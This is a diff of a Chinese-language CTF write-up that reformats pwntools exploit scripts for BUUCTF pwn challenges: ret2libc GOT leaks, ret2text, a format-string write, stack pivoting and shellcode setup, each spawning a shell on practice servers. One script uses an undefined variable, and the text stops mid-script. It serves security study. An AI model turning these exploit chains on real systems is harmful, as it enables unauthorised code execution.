@@ -8,296 +8,36 @@ by Maple
 ret2libc
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
+p = remote('node5.buuoj.cn',27252)
+def dbg():
+    gdb.attach(p)
+    pause()
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+main = elf.sym['main']
 
-p
+payload = b'a'*0x88+b'b'*4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
+p.sendline(payload)
 
-=
+write_addr = u32(p.recv(4))
+libc  = LibcSearcher('write',write_addr)
+libc_base = write_addr-libc.dump('write')
+log.info("libc_base:"+hex(libc_base))
 
-remote
-(
-'node5.buuoj.cn'
-,
-27252
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-write_got
-
-=
-
-elf
-.
-got
-[
-'write'
-]
-
-write_plt
-
-=
-
-elf
-.
-plt
-[
-'write'
-]
-
-main
-
-=
-
-elf
-.
-sym
-[
-'main'
-]
-
-payload
-
-=
-
-b
-'a'
-*
-0x88
-+
-b
-'b'
-*
-4
-+
-p32
-(
-write_plt
-)
-+
-p32
-(
-main
-)
-+
-p32
-(
-1
-)
-+
-p32
-(
-write_got
-)
-+
-p32
-(
-4
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-write_addr
-
-=
-
-u32
-(
-p
-.
-recv
-(
-4
-))
-
-libc
-
-=
-
-LibcSearcher
-(
-'write'
-,
-write_addr
-)
-
-libc_base
-
-=
-
-write_addr
--
-libc
-.
-dump
-(
-'write'
-)
-
-log
-.
-info
-(
-"libc_base:"
-+
-hex
-(
-libc_base
-))
-
-sys
-
-=
-
-libc_base
-+
-libc
-.
-dump
-(
-'system'
-)
-
-binsh
-
-=
-
-libc_base
-+
-libc
-.
-dump
-(
-'str_bin_sh'
-)
-
-payload2
-
-=
-
-b
-'a'
-*
-0x88
-+
-b
-'b'
-*
-4
-+
-p32
-(
-sys
-)
-+
-p32
-(
-0
-)
-+
-p32
-(
-binsh
-)
-
-p
-.
-sendline
-(
-payload2
-)
-
-p
-.
-interactive
-()
-
+sys = libc_base+libc.dump('system')
+binsh = libc_base+libc.dump('str_bin_sh')
+payload2 = b'a'*0x88+b'b'*4+p32(sys)+p32(0)+p32(binsh)
+p.sendline(payload2)
+p.interactive()
 ```
 
 
@@ -306,150 +46,24 @@ interactive
 看源码，发现输入长度是`int`型，而`read`读取的长度为`unsigned int`型，所以输入-1就可以了
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
-
-p
-
-=
-
-remote
-(
-'node5.buuoj.cn'
-,
-27683
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-p
-.
-sendline
-(
-'-1'
-)
-
-p
-.
-recvuntil
-(
-b
-'name?
-\n
-'
-)
-
-payload
-
-=
-
-b
-'a'
-*
-0x10
-+
-b
-'b'
-*
-0x8
-+
-p64
-(
-0x400726
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+p = remote('node5.buuoj.cn',27683)
+def dbg():
+    gdb.attach(p)
+    pause()
+p.sendline('-1')
+p.recvuntil(b'name?\n')
+payload = b'a'*0x10+b'b'*0x8+p64(0x400726)
+p.sendline(payload)
+p.interactive()
 ```
 
 
@@ -458,321 +72,38 @@ interactive
 ret2libc
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
+p = remote('node5.buuoj.cn',26423)
+def dbg():
+    gdb.attach(p)
+    pause()
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
+main=elf.sym['main']
+pop_rdi = 0x400733
 
-p
+p.recvuntil(b'story!\n')
+payload = b'a'*0x20+b'b'*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
+p.sendline(payload)
 
-=
+puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+libc = LibcSearcher('puts',puts_addr)
+libc_base = puts_addr-libc.dump('puts')
 
-remote
-(
-'node5.buuoj.cn'
-,
-26423
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-puts_plt
-=
-elf
-.
-plt
-[
-'puts'
-]
-
-puts_got
-=
-elf
-.
-got
-[
-'puts'
-]
-
-main
-=
-elf
-.
-sym
-[
-'main'
-]
-
-pop_rdi
-
-=
-
-0x400733
-
-p
-.
-recvuntil
-(
-b
-'story!
-\n
-'
-)
-
-payload
-
-=
-
-b
-'a'
-*
-0x20
-+
-b
-'b'
-*
-0x8
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-puts_got
-)
-+
-p64
-(
-puts_plt
-)
-+
-p64
-(
-main
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-puts_addr
-
-=
-
-u64
-(
-p
-.
-recvuntil
-(
-b
-'
-\x7f
-'
-)[
--
-6
-:]
-.
-ljust
-(
-8
-,
-b
-'
-\x00
-'
-))
-
-libc
-
-=
-
-LibcSearcher
-(
-'puts'
-,
-puts_addr
-)
-
-libc_base
-
-=
-
-puts_addr
--
-libc
-.
-dump
-(
-'puts'
-)
-
-p
-.
-recvuntil
-(
-b
-'story!
-\n
-'
-)
-
-sys
-
-=
-
-libc_base
-+
-libc
-.
-dump
-(
-'system'
-)
-
-binsh
-
-=
-
-libc_base
-+
-libc
-.
-dump
-(
-'str_bin_sh'
-)
-
-payload2
-
-=
-
-b
-'a'
-*
-0x20
-+
-b
-'b'
-*
-0x8
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-binsh
-)
-+
-p64
-(
-sys
-)
-+
-p64
-(
-main
-)
-
-p
-.
-sendline
-(
-payload2
-)
-
-p
-.
-interactive
-()
-
+p.recvuntil(b'story!\n')
+sys = libc_base+libc.dump('system')
+binsh = libc_base+libc.dump('str_bin_sh')
+payload2 = b'a'*0x20+b'b'*0x8+p64(pop_rdi)+p64(binsh)+p64(sys)+p64(main)
+p.sendline(payload2)
+p.interactive()
 ```
 
 
@@ -783,50 +114,12 @@ interactive
 直接找到x的地址，用自带函数就行
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
-payload
-
-=
-
-fmtstr_payload
-(
-11
-,{
-0x804a02c
-:
-0x4
-})
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+```python
+from pwn import *
+p = process('./pwn')
+payload = fmtstr_payload(11,{0x804a02c:0x4})
+p.sendline(payload)
+p.interactive()
 ```
 
 
@@ -835,146 +128,34 @@ interactive
 这道题有一点小坑,一般都是将`ebp`压入栈，然后将`esp`的值赋值给`ebp`，然后`esp`减去对应的栈空间的大小
 
 
-```
-
+```asm
 push    ebp
 mov     ebp, esp
 sub     esp, 18h
-
 ```
 
 但是这道题直接将`rsp`减去0x88，这里并没有把`rbp`压入栈，所以只需要0x88大小就可以覆盖返回地址了
 
 
-```
+```python
+from pwn import *
 
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
+p = remote('node5.buuoj.cn',28402)
+def dbg():
+    gdb.attach(p)
+    pause()
 
-p
-
-=
-
-remote
-(
-'node5.buuoj.cn'
-,
-28402
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-payload
-
-=
-
-b
-'a'
-*
-0x88
-+
-p64
-(
-0x400620
-)
-
-p
-.
-recvuntil
-(
-':'
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+payload = b'a'*0x88+p64(0x400620)
+p.recvuntil(':')
+p.sendline(payload)
+p.interactive()
 ```
 
 
@@ -985,193 +166,26 @@ interactive
 我觉得这位师傅讲的不错，[ciscn\_2019\_es\_2](https://bbs.kanxue.com/thread-269163.htm)
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-
-context
-.
-terminal
-
-=
-
-[
-'terminator'
-,
-'-x'
-,
-'sh'
-,
-'-c'
-]
-
-context
-.
-log_level
-=
-'debug'
-
-p
-=
-remote
-(
-'node5.buuoj.cn'
-,
-25052
-)
-
+```python
+from pwn import * 
+context.terminal = ['terminator','-x','sh','-c']
+context.log_level='debug'
+p=remote('node5.buuoj.cn',25052)
 #p=process("./pwn")
+elf = ELF('./pwn')
+sys_addr=elf.sym['system']
+leave_ret=0x080484b8
+p.recvuntil("name?\n")
+payload1= 0x20*"a"+"b"*0x8
+p.send(payload1)
+p.recvuntil("b"*0x8)
+ebp_addr=u32(p.recv(4))
 
-elf
+log.info('ebp:'+hex(ebp_addr))
 
-=
-
-ELF
-(
-'./pwn'
-)
-
-sys_addr
-=
-elf
-.
-sym
-[
-'system'
-]
-
-leave_ret
-=
-0x080484b8
-
-p
-.
-recvuntil
-(
-"name?
-\n
-"
-)
-
-payload1
-=
-
-0x20
-*
-"a"
-+
-"b"
-*
-0x8
-
-p
-.
-send
-(
-payload1
-)
-
-p
-.
-recvuntil
-(
-"b"
-*
-0x8
-)
-
-ebp_addr
-=
-u32
-(
-p
-.
-recv
-(
-4
-))
-
-log
-.
-info
-(
-'ebp:'
-+
-hex
-(
-ebp_addr
-))
-
-payload2
-
-=
-
-(
-b
-"aaaa"
-+
-p32
-(
-sys_addr
-)
-+
-b
-'aaaa'
-+
-p32
-(
-ebp_addr
--
-0x28
-)
-+
-b
-'/bin/sh'
-)
-.
-ljust
-(
-0x28
-,
-b
-'
-\x00
-'
-)
-+
-p32
-(
-ebp_addr
--
-0x38
-)
-
-+
-
-p32
-(
-leave_ret
-)
-
-p
-.
-send
-(
-payload2
-)
-
-p
-.
-interactive
-()
-
+payload2 = (b"aaaa"+p32(sys_addr)+b'aaaa'+p32(ebp_addr-0x28)+b'/bin/sh').ljust(0x28,b'\x00')+p32(ebp_addr-0x38) + p32(leave_ret)
+p.send(payload2)
+p.interactive()
 ```
 
 
@@ -1180,87 +194,17 @@ interactive
 `vul`函数看一下
 
 
-```
-
-int
-
-vul
-()
-
+```asm
+int vul()
 {
+  char s[40]; // [esp+0h] [ebp-28h] BYREF
 
-
-char
-
-s
-[
-40
-];
-
-// [esp+0h] [ebp-28h] BYREF
-
-
-memset
-(
-s
-,
-
-0
-,
-
-0x20u
-);
-
-
-read
-(
-0
-,
-
-s
-,
-
-0x30u
-);
-
-
-printf
-(
-"Hello, %s
-\n
-"
-,
-
-s
-);
-
-
-read
-(
-0
-,
-
-s
-,
-
-0x30u
-);
-
-
-return
-
-printf
-(
-"Hello, %s
-\n
-"
-,
-
-s
-);
-
+  memset(s, 0, 0x20u);
+  read(0, s, 0x30u);
+  printf("Hello, %s\n", s);
+  read(0, s, 0x30u);
+  return printf("Hello, %s\n", s);
 }
-
 ```
 
 可以看到`read`大小为0x30，但是s变量和ebp的距离是0x28。八字节的溢出只够覆盖`ebp`和`ret`，不可以做到直接修改`hack`函数里system的参数。**所以我们利用`leave_ret`挟持esp进行栈迁移**
@@ -1302,84 +246,17 @@ s
 当然此处我们还有一个问题就是'/bin/sh'的地址我们不知道。我们可以通过泄露原来ebp的值来确定，我们将此地址叫做addr，以免和ebp寄存器混淆
 
 
-```
-
-int
-
-vul
-()
-
+```asm
+int vul()
 {
+    char s[40]; //  [esp+0h][ebp-28h]BYREF
 
-
-char
-
-s
-[
-40
-];
-
-//  [esp+0h][ebp-28h]BYREF
-
-
-memset
-(
-s
-,
-
-0x20u
-);
-
-
-read
-(
-0
-,
-
-s
-,
-
-0x30u
-);
-
-
-printf
-(
-"Hello, %s
-\n
-"
-,
-
-s
-);
-
-
-read
-(
-0
-,
-
-s
-,
-
-0x30u
-);
-
-
-return
-
-printf
-(
-"Hello, %s
-\n
-"
-,
-
-s
-);
-
+    memset(s, 0x20u);
+    read(0, s, 0x30u);
+    printf("Hello, %s\n", s);
+    read(0, s, 0x30u);
+    return printf("Hello, %s\n", s);
 }
-
 ```
 
 可以看到有一个printf函数
@@ -1394,292 +271,39 @@ printf函数会打印s字符串，且遇到0就会停止打印，所以如果我
 ret2libc，但是用`printf`输出`read`函数的地址
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
 #p=process('./pwn')
+p=remote('node5.buuoj.cn',25118)
+elf=ELF('./pwn')
 
-p
-=
-remote
-(
-'node5.buuoj.cn'
-,
-25118
-)
+read_got=elf.got['read']
+printf_plt=elf.plt['printf']
+main_addr=elf.sym['main']
+format_addr=0x400770    # 原本输出字符串的地址
+pop_rdi = 0x400733
+pop_rsi_r15 = 0x400731
 
-elf
-=
-ELF
-(
-'./pwn'
-)
-
-read_got
-=
-elf
-.
-got
-[
-'read'
-]
-
-printf_plt
-=
-elf
-.
-plt
-[
-'printf'
-]
-
-main_addr
-=
-elf
-.
-sym
-[
-'main'
-]
-
-format_addr
-=
-0x400770
-
-
-# 原本输出字符串的地址
-
-pop_rdi
-
-=
-
-0x400733
-
-pop_rsi_r15
-
-=
-
-0x400731
-
-payload
-=
-b
-'a'
-*
-0x20
-+
-b
-'b'
-*
-0x8
-
-
-# 设置溢出覆盖返回地址
-
-payload
-+=
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-format_addr
-)
-
-
-# pop_rdi弹入原本字符串
-
-payload
-+=
-p64
-(
-pop_rsi_r15
-)
-+
-p64
-(
-read_got
-)
-+
-p64
-(
-0
-)
-
-
+payload=b'a'*0x20+b'b'*0x8  # 设置溢出覆盖返回地址
+payload+=p64(pop_rdi)+p64(format_addr)  # pop_rdi弹入原本字符串
+payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)
 # ret到pop_rsi_r15，将read的got表地址弹入rsi，随便一个东西弹入r15
-
-payload
-+=
-p64
-(
-printf_plt
-)
-+
-p64
-(
-main_addr
-)
-
-
+payload+=p64(printf_plt)+p64(main_addr)
 # ret到printf的plt表地址，也就是调用plt，然后返回main
 
-p
-.
-sendlineafter
-(
-b
-"name?"
-,
-payload
-)
+p.sendlineafter(b"name?",payload)
+p.recvuntil(b'!\n')
+read_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+libc=LibcSearcher("read",read_addr)
+libc_base=read_addr-libc.dump('read')
+log.info("libc_base:"+hex(libc_base))
 
-p
-.
-recvuntil
-(
-b
-'!
-\n
-'
-)
-
-read_addr
-=
-u64
-(
-p
-.
-recvuntil
-(
-b
-'
-\x7f
-'
-)[
--
-6
-:]
-.
-ljust
-(
-8
-,
-b
-'
-\x00
-'
-))
-
-libc
-=
-LibcSearcher
-(
-"read"
-,
-read_addr
-)
-
-libc_base
-=
-read_addr
--
-libc
-.
-dump
-(
-'read'
-)
-
-log
-.
-info
-(
-"libc_base:"
-+
-hex
-(
-libc_base
-))
-
-sys_addr
-=
-libc_base
-+
-libc
-.
-dump
-(
-"system"
-)
-
-binsh_addr
-=
-libc_base
-+
-libc
-.
-dump
-(
-"str_bin_sh"
-)
-
-payload2
-=
-b
-'a'
-*
-40
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-binsh_addr
-)
-+
-p64
-(
-sys_addr
-)
-+
-p64
-(
-0
-)
-
-p
-.
-sendline
-(
-payload2
-)
-
-p
-.
-interactive
-()
-
+sys_addr=libc_base+libc.dump("system")
+binsh_addr=libc_base+libc.dump("str_bin_sh")
+payload2=b'a'*40+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(0)
+p.sendline(payload2)
+p.interactive()
 ```
 
 这道题远程直接`cat flag`不能用，先`find -name "flag"`找到flag放在了`./home/babyrop2/flag`里，再`cat`
@@ -1693,125 +317,28 @@ interactive
 
 
 ```
-
 if (win1 && win2 && a1 == -559039827)
-
 ```
 
 是`win1和win2`,`a1和-559039827`,得到的结果再`&&`
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
+from pwn import *
 #p = process('./pwn')
-
-p
-
-=
-
-remote
-(
-'node5.buuoj.cn'
-,
-26736
-)
-
-win1_addr
-
-=
-
-0x80485CB
-
-win2_addr
-
-=
-
-0x80485D8
-
-flag
-
-=
-
-0x804862B
-
-pop_ebp
-
-=
-
-0x80485d6
-
-payload
-
-=
-
-b
-'a'
-*
-0x18
-+
-b
-'b'
-*
-0x4
-+
-p32
-(
-win1_addr
-)
-+
-p32
-(
-win2_addr
-)
-+
-p32
-(
-flag
-)
-+
-p32
-(
-0xBAAAAAAD
-)
-+
-p32
-
-(
-0xDEADBAAD
-)
-
-
+p = remote('node5.buuoj.cn',26736)
+win1_addr = 0x80485CB
+win2_addr = 0x80485D8
+flag = 0x804862B
+pop_ebp = 0x80485d6
+payload = b'a'*0x18+b'b'*0x4+p32(win1_addr)+p32(win2_addr)+p32(flag)+p32(0xBAAAAAAD)+p32
+(0xDEADBAAD)
 # 先返回到win1使得win1 = 1
-
-
 # 然后返回win2，因为要与ebp+8比较，所以中间先加一个flag_addr
-
-
 # 比较好了直接返回到flag_addr
-
-
 # 然后与ebp+8进行比较，正好夹了一个0xBAAAAAAD
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+p.sendline(payload)
+p.interactive()
 ```
 
 
@@ -1825,302 +352,33 @@ interactive
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-*
-
-from
-
-time
-
-import
-
-sleep
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'arm64'
-,
-
-log_level
-=
-'debug'
-)
-
-r
-
-=
-
-remote
-(
-"node5.buuoj.cn"
-,
-26858
-)
-
-elf
-
-=
-
-ELF
-(
-'./pwn'
-)
-
-printf_plt
-
-=
-
-elf
-.
-plt
-[
-'printf'
-]
-
-printf_got
-
-=
-
-elf
-.
-got
-[
-'printf'
-]
-
-start_addr
-
-=
-
-elf
-.
-sym
-[
-'main'
-]
-
-r
-.
-recvuntil
-(
-'read?'
-)
-
-r
-.
-sendline
-(
-'-1'
-)
-
-r
-.
-recvuntil
-(
-"data!
-\n
-"
-)
-
-payload
-
-=
-
-b
-'a'
-
-*
-
-(
-0x2c
-+
-4
-)
-
-+
-
-p32
-(
-printf_plt
-)
-
-+
-
-p32
-(
-start_addr
-)
-
-+
-
-p32
-(
-printf_got
-)
-
-r
-.
-sendline
-(
-payload
-)
-
-r
-.
-recvuntil
-(
-'
-\n
-'
-)
-
-printf_addr
-=
-u32
-(
-r
-.
-recv
-(
-4
-))
-
-libc
-
-=
-
-LibcSearcher
-(
-'printf'
-,
-printf_addr
-)
-
-libc_base
-
-=
-
-printf_addr
--
-libc
-.
-dump
-(
-'printf'
-)
-
-system_addr
-
-=
-
-base
-+
-libc
-.
-dump
-(
-'system'
-)
-
-bin_sh
-
-=
-
-base
-
-+
-
-libc
-.
-dump
-(
-'str_bin_sh'
-)
-
-r
-.
-recvuntil
-(
-'read?'
-)
-
-r
-.
-sendline
-(
-'-1'
-)
-
-r
-.
-recvuntil
-(
-"data!
-\n
-"
-)
-
-payload
-
-=
-
-b
-'a'
-*
-(
-0x2c
-+
-4
-)
-+
-p32
-(
-system_addr
-)
-+
-p32
-(
-start_addr
-)
-+
-p32
-(
-bin_sh
-)
-
-r
-.
-sendline
-(
-payload
-)
-
-r
-.
-interactive
-()
-
+from pwn import *
+from LibcSearcher import *
+from time import sleep
+context(os='linux', arch='arm64', log_level='debug')
+r = remote("node5.buuoj.cn",26858)
+elf = ELF('./pwn')
+printf_plt = elf.plt['printf']
+printf_got = elf.got['printf']
+start_addr = elf.sym['main']
+r.recvuntil('read?')
+r.sendline('-1')
+r.recvuntil("data!\n")
+payload = b'a' * (0x2c+4) + p32(printf_plt) + p32(start_addr) + p32(printf_got)
+r.sendline(payload)
+r.recvuntil('\n')
+printf_addr=u32(r.recv(4))
+libc = LibcSearcher('printf',printf_addr)
+
+libc_base = printf_addr-libc.dump('printf')
+system_addr = base+libc.dump('system')
+bin_sh = base + libc.dump('str_bin_sh')
+r.recvuntil('read?')
+r.sendline('-1')
+r.recvuntil("data!\n")
+payload = b'a'*(0x2c+4)+p32(system_addr)+p32(start_addr)+p32(bin_sh)
+r.sendline(payload)
+r.interactive()
 ```
 
 
@@ -2129,305 +387,35 @@ interactive
 ***ret2libc***
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'i386'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc-2.19.so")
-
 #p = process('./pwn')
+p = remote('node5.buuoj.cn',28662)
+def dbg():
+    gdb.attach(p)
+    pause()
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+main = elf.sym['main']
+payload = b'b'*0x88+b'b'*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(0x4)
+p.recvuntil('Input:\n')
+p.sendline(payload)
+write_addr = u32(p.recv(4))
+libc = LibcSearcher('write',write_addr)
+libc_base = write_addr-libc.dump('write')
+log.info("libc_base:"+hex(libc_base))
 
-p
-
-=
-
-remote
-(
-'node5.buuoj.cn'
-,
-28662
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-write_plt
-
-=
-
-elf
-.
-plt
-[
-'write'
-]
-
-write_got
-
-=
-
-elf
-.
-got
-[
-'write'
-]
-
-main
-
-=
-
-elf
-.
-sym
-[
-'main'
-]
-
-payload
-
-=
-
-b
-'b'
-*
-0x88
-+
-b
-'b'
-*
-0x4
-+
-p32
-(
-write_plt
-)
-+
-p32
-(
-main
-)
-+
-p32
-(
-1
-)
-+
-p32
-(
-write_got
-)
-+
-p32
-(
-0x4
-)
-
-p
-.
-recvuntil
-(
-'Input:
-\n
-'
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-write_addr
-
-=
-
-u32
-(
-p
-.
-recv
-(
-4
-))
-
-libc
-
-=
-
-LibcSearcher
-(
-'write'
-,
-write_addr
-)
-
-libc_base
-
-=
-
-write_addr
--
-libc
-.
-dump
-(
-'write'
-)
-
-log
-.
-info
-(
-"libc_base:"
-+
-hex
-(
-libc_base
-))
-
-sys
-
-=
-
-libc_base
-+
-libc
-.
-dump
-(
-'system'
-)
-
-binsh
-
-=
-
-libc_base
-+
-libc
-.
-dump
-(
-'str_bin_sh'
-)
-
-payload
-
-=
-
-b
-'b'
-*
-0x88
-+
-b
-'b'
-*
-0x4
-+
-p32
-(
-sys
-)
-+
-p32
-(
-0
-)
-+
-p32
-(
-binsh
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+sys = libc_base+libc.dump('system')
+binsh = libc_base+libc.dump('str_bin_sh')
+payload = b'b'*0x88+b'b'*0x4+p32(sys)+p32(0)+p32(binsh)
+p.sendline(payload)
+p.interactive()
 ```
 
 
@@ -2441,133 +429,23 @@ interactive
 ***ret2text***
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
+p = remote('node5.buuoj.cn',25069)
+def dbg():
+    gdb.attach(p)
+    pause()
 
-p
-
-=
-
-remote
-(
-'node5.buuoj.cn'
-,
-25069
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-payload
-
-=
-
-b
-'b'
-*
-0x18
-+
-b
-'b'
-*
-0x4
-+
-p32
-(
-0x8048524
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+payload = b'b'*0x18+b'b'*0x4+p32(0x8048524)
+p.sendline(payload)
+p.interactive()
 ```
 
 
@@ -2579,77 +457,15 @@ interactive
 
 
 ```
-
-[
-*
-]
-
-'/home/pwn/pwn/buuctf/33/pwn'
-
-
-Arch:
-
-i386-32-little
-
-
-RELRO:
-
-Full
-
-RELRO
-
-
-Stack:
-
-No
-
-canary
-
-found
-
-
-NX:
-
-NX
-
-unknown
-
--
-
-GNU_STACK
-
-missing
-
-
-PIE:
-
-No
-
-PIE
-
-(
-0x8048000
-)
-
-
-Stack:
-
-Executable
-
-
-RWX:
-
-Has
-
-RWX
-
-segments
-
-
-Stripped:
-
-No
-
+[*] '/home/pwn/pwn/buuctf/33/pwn'
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x8048000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
 ```
 
 保护全关，有可读可写可执行段，可能是`shellcode`
@@ -2676,17 +492,7 @@ No
 
 
 ```
-
-printf
-(
-"Yippie, lets crash: %p
-\n
-"
-,
-
-s
-);
-
+  printf("Yippie, lets crash: %p\n", s);
 ```
 
 那么我们算出shellcode和我们输入的起始位置的偏移，就可以得到shellcode的地址
@@ -2694,103 +500,24 @@ s
 先写一个测试脚本
 
 
-```
+```python
+from pwn import *
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+p=process('./pwn')
+context.log_level='debug'
 
-from
+gdb.attach(p,'b *0x8048600')#利用gdb动调，在0x8048600处下了个断点
 
-pwn
+p.recvuntil('crash: ')
+stack=int(p.recv(10),16)
+print (hex(stack))
 
-import
+payload='crashme\x00'+'aaaaaa'#前面的crashme\x00绕过if判断
+      #后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址
 
-*
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-p
-=
-process
-(
-'./pwn'
-)
-
-context
-.
-log_level
-=
-'debug'
-
-gdb
-.
-attach
-(
-p
-,
-'b *0x8048600'
-)
-#利用gdb动调，在0x8048600处下了个断点
-
-p
-.
-recvuntil
-(
-'crash: '
-)
-
-stack
-=
-int
-(
-p
-.
-recv
-(
-10
-),
-16
-)
-
-print
-
-(
-hex
-(
-stack
-))
-
-payload
-=
-'crashme
-\x00
-'
-+
-'aaaaaa'
